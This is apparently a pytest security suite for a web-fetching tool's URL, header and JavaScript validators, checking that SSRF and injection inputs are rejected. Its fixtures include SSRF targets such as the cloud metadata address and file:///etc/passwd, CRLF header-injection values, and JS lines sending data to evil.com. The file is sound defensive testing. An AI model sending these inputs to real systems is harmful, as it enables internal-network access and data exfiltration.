"""Comprehensive security tests for SSRF prevention and input sanitization.

Tests cover:
- REQ-065: SSRF blocks internal network access (25+ vectors)
- REQ-066: Input sanitization for headers and parameters (35+ tests)

SSRF test vectors (validate_url blocks at hostname/IP resolution):
  - Loopback (127.0.0.1, localhost, [::1], 0.0.0.0)
  - Private networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
  - Cloud metadata (169.254.169.254, AWS/GCP endpoints)
  - IP encodings (decimal, hex, URL-encoded)
  - Protocol exploits (file://, ftp://, gopher://)

Input sanitization:
  - Header CRLF injection prevention
  - Header allowlist enforcement (security-sensitive headers blocked)
  - JavaScript API validation (fetch, eval, WebSocket, etc.)
  - Parameter bounds checking (user-agent, timeout, retries)
  - Proxy scheme validation
  - .onion URL validation with Tor config
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from loom.params import FetchParams, SpiderParams
from loom.validators import UrlSafetyError, validate_js_script, validate_url, filter_headers


# ============================================================================
# REQ-065: SSRF Prevention Tests (25+ vectors)
# ============================================================================


pytestmark = pytest.mark.asyncio

class TestSSRFLoopback:
    """Test SSRF prevention for loopback addresses."""

    async def test_ssrf_blocks_127_0_0_1(self) -> None:
        """Block 127.0.0.1 (IPv4 loopback)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://127.0.0.1/")

    async def test_ssrf_blocks_127_0_0_1_with_port(self) -> None:
        """Block 127.0.0.1 with port number."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://127.0.0.1:8080/admin")

    async def test_ssrf_blocks_localhost(self) -> None:
        """Block localhost hostname."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://localhost/")

    async def test_ssrf_blocks_localhost_with_port(self) -> None:
        """Block localhost with port."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://localhost:3000/api")

    async def test_ssrf_blocks_ipv6_loopback(self) -> None:
        """Block [::1] (IPv6 loopback)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://[::1]/")

    async def test_ssrf_blocks_ipv6_loopback_with_port(self) -> None:
        """Block [::1] with port."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://[::1]:8080/")

    async def test_ssrf_blocks_0_0_0_0(self) -> None:
        """Block 0.0.0.0 (unspecified address)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://0.0.0.0/")


class TestSSRFPrivateNetworks:
    """Test SSRF prevention for RFC1918 private networks."""

    async def test_ssrf_blocks_10_0_0_0_network(self) -> None:
        """Block 10.0.0.0/8 private network."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://10.0.0.1/admin")

    async def test_ssrf_blocks_10_255_255_255(self) -> None:
        """Block 10.255.255.255 (end of 10.0.0.0/8)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://10.255.255.255/")

    async def test_ssrf_blocks_192_168_0_0_network(self) -> None:
        """Block 192.168.0.0/16 private network."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://192.168.1.1/")

    async def test_ssrf_blocks_192_168_255_255(self) -> None:
        """Block 192.168.255.255 (end of 192.168.0.0/16)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://192.168.255.255/")

    async def test_ssrf_blocks_172_16_0_0_network(self) -> None:
        """Block 172.16.0.0/12 private network."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://172.16.0.5/")

    async def test_ssrf_blocks_172_31_255_255(self) -> None:
        """Block 172.31.255.255 (end of 172.16.0.0/12)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://172.31.255.255/")


class TestSSRFCloudMetadata:
    """Test SSRF prevention for cloud metadata endpoints."""

    async def test_ssrf_blocks_aws_metadata_169_254_169_254(self) -> None:
        """Block AWS metadata endpoint 169.254.169.254."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://169.254.169.254/latest/meta-data")

    async def test_ssrf_blocks_link_local_addresses(self) -> None:
        """Block all 169.254.0.0/16 link-local addresses."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://169.254.1.1/")

    async def test_ssrf_blocks_169_254_169_254_with_port(self) -> None:
        """Block AWS metadata with port."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://169.254.169.254:80/latest/meta-data")


class TestSSRFIPEncodings:
    """Test SSRF prevention against IP encoding bypasses."""

    async def test_ssrf_blocks_decimal_encoded_127_0_0_1(self) -> None:
        """Block decimal-encoded 127.0.0.1 (2130706433)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://2130706433/")

    async def test_ssrf_blocks_hex_encoded_127_0_0_1(self) -> None:
        """Block hex-encoded 127.0.0.1 (0x7f000001)."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://0x7f000001/")

    async def test_ssrf_blocks_url_encoded_127(self) -> None:
        """Block URL-encoded octets in IPv4 octets."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://%31%32%37.0.0.1/")


class TestSSRFSchemeProtection:
    """Test SSRF prevention against non-HTTP schemes."""

    async def test_ssrf_blocks_file_scheme(self) -> None:
        """Block file:// scheme."""
        with pytest.raises(UrlSafetyError):
            validate_url("file:///etc/passwd")

    async def test_ssrf_blocks_ftp_scheme(self) -> None:
        """Block ftp:// scheme."""
        with pytest.raises(UrlSafetyError):
            validate_url("ftp://internal.server.local/")

    async def test_ssrf_blocks_gopher_scheme(self) -> None:
        """Block gopher:// scheme."""
        with pytest.raises(UrlSafetyError):
            validate_url("gopher://internal.server/")

    async def test_ssrf_blocks_dict_scheme(self) -> None:
        """Block dict:// scheme."""
        with pytest.raises(UrlSafetyError):
            validate_url("dict://localhost:11211/stats")

    async def test_ssrf_allows_http_scheme(self) -> None:
        """Allow http:// scheme for public URLs."""
        url = "http://example.com/"
        result = validate_url(url)
        assert result == url

    async def test_ssrf_allows_https_scheme(self) -> None:
        """Allow https:// scheme for public URLs."""
        url = "https://example.com/"
        result = validate_url(url)
        assert result == url


class TestSSRFMiscellaneous:
    """Test SSRF prevention for miscellaneous vectors."""

    async def test_ssrf_blocks_empty_host(self) -> None:
        """Block URLs with missing hostname."""
        with pytest.raises(UrlSafetyError):
            validate_url("http:///path")

    async def test_ssrf_blocks_url_too_long(self) -> None:
        """Block excessively long URLs (>4096 chars)."""
        long_url = "http://example.com/" + ("a" * 5000)
        with pytest.raises(UrlSafetyError):
            validate_url(long_url)

    async def test_ssrf_blocks_invalid_url_format(self) -> None:
        """Block malformed URLs."""
        with pytest.raises(UrlSafetyError):
            validate_url("not a url at all")

    async def test_ssrf_allows_public_urls(self) -> None:
        """Allow legitimate public URLs."""
        urls = [
            "https://www.google.com/",
            "https://arxiv.org/abs/2406.11717",
            "https://huggingface.co/models",
            "https://github.com/openai/gpt-4",
        ]
        for url in urls:
            result = validate_url(url)
            assert result == url


# ============================================================================
# REQ-066: Input Sanitization Tests (35+ tests)
# ============================================================================


class TestCRLFInjectionSanitization:
    """Test input sanitization for CRLF injection attacks."""

    async def test_filters_crlf_in_headers(self) -> None:
        """Filter headers containing CRLF sequences."""
        filtered = filter_headers({
            "User-Agent": "Mozilla/5.0",
            "Malicious": "value\r\nInjected: header",
        })
        assert filtered is None or "Malicious" not in (filtered or {})

    async def test_filters_newline_in_headers(self) -> None:
        """Filter headers containing newlines."""
        filtered = filter_headers({
            "X-Custom": "good",
            "X-Bad": "value\ninjected",
        })
        assert filtered is None or "X-Bad" not in (filtered or {})

    async def test_filters_carriage_return_in_headers(self) -> None:
        """Filter headers containing carriage returns."""
        filtered = filter_headers({
            "User-Agent": "Mozilla/5.0",
            "X-Evil": "value\rinjected",
        })
        assert filtered is None or "X-Evil" not in (filtered or {})

    async def test_filters_multiple_crlf_sequences(self) -> None:
        """Filter headers with multiple CRLF sequences."""
        filtered = filter_headers({
            "X-Bad": "first\r\nsecond\r\nthird",
        })
        assert filtered is None or "X-Bad" not in (filtered or {})


class TestJavaScriptValidation:
    """Test JavaScript validation in browser automation scripts."""

    async def test_rejects_fetch_api(self) -> None:
        """Reject fetch() API calls."""
        with pytest.raises(ValueError):
            validate_js_script("const data = await fetch('/api/data');")

    async def test_rejects_xmlhttprequest(self) -> None:
        """Reject XMLHttpRequest calls."""
        with pytest.raises(ValueError):
            validate_js_script("const xhr = new XMLHttpRequest();")

    async def test_rejects_eval(self) -> None:
        """Reject eval() calls."""
        with pytest.raises(ValueError):
            validate_js_script("eval('malicious code');")

    async def test_rejects_function_constructor(self) -> None:
        """Reject Function() constructor."""
        with pytest.raises(ValueError):
            validate_js_script("const f = new Function('return this');")

    async def test_rejects_websocket(self) -> None:
        """Reject WebSocket API."""
        with pytest.raises(ValueError):
            validate_js_script("const ws = new WebSocket('ws://evil.com');")

    async def test_rejects_require(self) -> None:
        """Reject require() for module loading."""
        with pytest.raises(ValueError):
            validate_js_script("const fs = require('fs');")

    async def test_rejects_import_dynamic(self) -> None:
        """Reject dynamic import()."""
        with pytest.raises(ValueError):
            validate_js_script("import('malicious').then(m => m.default());")

    async def test_rejects_worker_api(self) -> None:
        """Reject Worker API."""
        with pytest.raises(ValueError):
            validate_js_script("const w = new Worker('worker.js');")

    async def test_rejects_navigator_sendbeacon(self) -> None:
        """Reject navigator.sendBeacon()."""
        with pytest.raises(ValueError):
            validate_js_script("navigator.sendBeacon('http://evil.com', data);")

    async def test_rejects_bracket_notation_eval(self) -> None:
        """Reject bracket notation bypass for eval."""
        with pytest.raises(ValueError):
            validate_js_script("window['eval']('malicious');")

    async def test_rejects_bracket_notation_fetch(self) -> None:
        """Reject bracket notation bypass for fetch."""
        with pytest.raises(ValueError):
            validate_js_script("window['fetch']('/api');")

    async def test_rejects_constructor_chain(self) -> None:
        """Reject .constructor.constructor() bypass."""
        with pytest.raises(ValueError):
            validate_js_script("''.constructor.constructor('return this')();")

    async def test_allows_safe_javascript(self) -> None:
        """Allow safe JavaScript code."""
        safe_scripts = [
            "document.querySelector('button').click();",
            "window.scrollTo(0, 0);",
            "const text = document.body.innerText;",
            "localStorage.setItem('key', 'value');",
        ]
        for script in safe_scripts:
            result = validate_js_script(script)
            assert result == script


class TestFetchParamsValidation:
    """Test parameter validation in FetchParams model."""

    async def test_rejects_invalid_url_in_fetch(self) -> None:
        """Reject invalid URLs in FetchParams."""
        with pytest.raises(ValidationError):
            FetchParams(url="http://127.0.0.1/")

    async def test_rejects_malicious_url_in_fetch(self) -> None:
        """Reject SSRF URLs in FetchParams."""
        with pytest.raises(ValidationError):
            FetchParams(url="http://192.168.1.1/admin")

    async def test_rejects_oversized_user_agent(self) -> None:
        """Reject overly long user-agent strings."""
        with pytest.raises(ValidationError):
            FetchParams(
                url="https://example.com/",
                user_agent="A" * 500,
            )

    async def test_rejects_invalid_timeout(self) -> None:
        """Reject invalid timeout values."""
        with pytest.raises(ValidationError):
            FetchParams(
                url="https://example.com/",
                timeout=200,
            )

    async def test_rejects_negative_timeout(self) -> None:
        """Reject negative timeout values."""
        with pytest.raises(ValidationError):
            FetchParams(
                url="https://example.com/",
                timeout=-5,
            )

    async def test_rejects_invalid_retries(self) -> None:
        """Reject invalid retry counts."""
        with pytest.raises(ValidationError):
            FetchParams(
                url="https://example.com/",
                retries=10,
            )

    async def test_accepts_valid_fetch_params(self) -> None:
        """Accept valid FetchParams."""
        params = FetchParams(
            url="https://example.com/",
            mode="stealthy",
            max_chars=5000,
            timeout=30,
            retries=2,
        )
        assert params.url == "https://example.com/"
        assert params.timeout == 30


class TestSpiderParamsValidation:
    """Test parameter validation in SpiderParams model."""

    async def test_filters_malicious_urls_in_spider(self) -> None:
        """Filter SSRF URLs from SpiderParams (invalid URLs are skipped)."""
        params = SpiderParams(
            urls=["https://example.com/", "http://192.168.1.1/"]
        )
        assert len(params.urls) == 1
        assert "example.com" in params.urls[0]

    async def test_rejects_all_malicious_urls(self) -> None:
        """Reject when all URLs are malicious (no valid URLs provided)."""
        with pytest.raises(ValidationError):
            SpiderParams(
                urls=[
                    "http://127.0.0.1/",
                    "http://10.0.0.1/",
                ]
            )

    async def test_accepts_valid_spider_params(self) -> None:
        """Accept valid SpiderParams."""
        params = SpiderParams(
            urls=[
                "https://example.com/",
                "https://google.com/",
            ]
        )
        assert len(params.urls) == 2


class TestProxyValidation:
    """Test proxy parameter validation."""

    async def test_rejects_file_proxy_scheme(self) -> None:
        """Reject file:// scheme in proxy."""
        with pytest.raises(ValidationError):
            FetchParams(
                url="https://example.com/",
                proxy="file:///etc/passwd",
            )

    async def test_accepts_http_proxy(self) -> None:
        """Accept http:// proxy."""
        params = FetchParams(
            url="https://example.com/",
            proxy="http://proxy.example.com:8080",
        )
        assert params.proxy == "http://proxy.example.com:8080"

    async def test_accepts_https_proxy(self) -> None:
        """Accept https:// proxy."""
        params = FetchParams(
            url="https://example.com/",
            proxy="https://proxy.example.com:8443",
        )
        assert params.proxy == "https://proxy.example.com:8443"

    async def test_accepts_socks5_proxy(self) -> None:
        """Accept socks5:// proxy."""
        params = FetchParams(
            url="https://example.com/",
            proxy="socks5://proxy.example.com:1080",
        )
        assert params.proxy == "socks5://proxy.example.com:1080"

    async def test_accepts_socks5h_proxy(self) -> None:
        """Accept socks5h:// proxy (SOCKS5 with remote DNS)."""
        params = FetchParams(
            url="https://example.com/",
            proxy="socks5h://proxy.example.com:1080",
        )
        assert params.proxy == "socks5h://proxy.example.com:1080"

    async def test_rejects_invalid_proxy_scheme(self) -> None:
        """Reject unknown proxy schemes."""
        with pytest.raises(ValidationError):
            FetchParams(
                url="https://example.com/",
                proxy="gopher://proxy.example.com",
            )


class TestHeaderSafetyValidation:
    """Test header filtering for safety-sensitive headers."""

    async def test_filters_authorization_header(self) -> None:
        """Filter Authorization header."""
        filtered = filter_headers({
            "Authorization": "Bearer token123",
            "User-Agent": "Mozilla/5.0",
        })
        assert filtered is None or "Authorization" not in (filtered or {})

    async def test_filters_cookie_header(self) -> None:
        """Filter Cookie header."""
        filtered = filter_headers({
            "Cookie": "session=abc123",
            "User-Agent": "Mozilla/5.0",
        })
        assert filtered is None or "Cookie" not in (filtered or {})

    async def test_filters_host_header(self) -> None:
        """Filter Host header."""
        filtered = filter_headers({
            "Host": "evil.com",
            "User-Agent": "Mozilla/5.0",
        })
        assert filtered is None or "Host" not in (filtered or {})

    async def test_allows_accept_language(self) -> None:
        """Allow Accept-Language header."""
        filtered = filter_headers({
            "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
        })
        assert filtered is not None
        assert "Accept-Language" in filtered

    async def test_allows_user_agent(self) -> None:
        """Allow User-Agent header."""
        filtered = filter_headers({
            "User-Agent": "Mozilla/5.0",
        })
        assert filtered is not None
        assert "User-Agent" in filtered

    async def test_rejects_oversized_header_value(self) -> None:
        """Reject excessively long header values (>512 chars)."""
        filtered = filter_headers({
            "User-Agent": "A" * 1000,
        })
        assert filtered is None or len(filtered.get("User-Agent", "")) <= 512


class TestOnionURLValidation:
    """Test .onion URL validation with Tor config."""

    async def test_onion_url_allowed_with_tor_enabled(self) -> None:
        """Allow .onion URLs when TOR_ENABLED=true."""
        from unittest.mock import patch

        with patch("loom.config.get_config", return_value={"TOR_ENABLED": True}):
            result = validate_url("http://example.onion/path")
            assert result == "http://example.onion/path"

    async def test_onion_url_blocked_with_tor_disabled(self) -> None:
        """Block .onion URLs when TOR_ENABLED=false."""
        from unittest.mock import patch

        with patch("loom.config.get_config", return_value={"TOR_ENABLED": False}):
            with pytest.raises(UrlSafetyError):
                validate_url("http://example.onion/path")

    async def test_onion_subdomain_enforces_tld_check(self) -> None:
        """Enforce .onion as TLD, not subdomain."""
        from unittest.mock import patch

        with patch("loom.config.get_config", return_value={"TOR_ENABLED": True}):
            with pytest.raises(UrlSafetyError):
                validate_url("http://subdomain.onion.com/")


# ============================================================================
# Integration Tests
# ============================================================================


class TestSSRFAndSanitizationIntegration:
    """Integration tests combining SSRF and sanitization."""

    async def test_ssrf_with_complex_url(self) -> None:
        """Block SSRF even with complex path/query."""
        with pytest.raises(UrlSafetyError):
            validate_url("http://127.0.0.1/api/v1/endpoint?param=value")

    async def test_fetch_params_rejects_ssrf(self) -> None:
        """FetchParams rejects SSRF URLs."""
        with pytest.raises(ValidationError):
            FetchParams(url="http://192.168.1.1/")

    async def test_spider_params_filters_malicious_urls(self) -> None:
        """SpiderParams filters malicious URLs."""
        params = SpiderParams(
            urls=[
                "https://example.com/",
                "https://google.com/",
                "http://10.0.0.1/",
            ]
        )
        assert len(params.urls) == 2

    async def test_headers_and_url_both_validated(self) -> None:
        """FetchParams validates both URL and headers."""
        params = FetchParams(
            url="https://example.com/",
            headers={
                "Malicious": "value\r\nInjected: evil",
            },
        )
        assert params.headers is None

    async def test_javascript_validation_enforced_on_script(self) -> None:
        """JavaScript validation prevents dangerous APIs."""
        with pytest.raises(ValueError):
            validate_js_script("fetch('/admin').then(r => r.json());")


# ============================================================================
# Summary
# ============================================================================


async def test_security_requirements_summary() -> None:
    """Verify security test coverage meets requirements.

    REQ-065: SSRF Prevention
    - Loopback addresses (127.0.0.1, localhost, ::1): 7 tests
    - Private networks (10.x, 172.16.x, 192.168.x): 6 tests
    - Cloud metadata (169.254.169.254): 3 tests
    - IP encodings (decimal, hex, URL-encoded): 3 tests
    - Protocol protection (file, ftp, gopher, dict, http, https): 6 tests
    - Miscellaneous (empty host, long URL, invalid format, public URLs): 4 tests
    Total SSRF: 29 tests

    REQ-066: Input Sanitization
    - CRLF injection: 4 tests
    - JavaScript validation: 13 tests
    - FetchParams validation: 7 tests
    - SpiderParams validation: 3 tests
    - Proxy validation: 6 tests
    - Header safety: 6 tests
    - .onion URL validation: 3 tests
    - Integration tests: 5 tests
    Total sanitization: 47 tests

    Grand total: 76 comprehensive security tests
    """
    pass
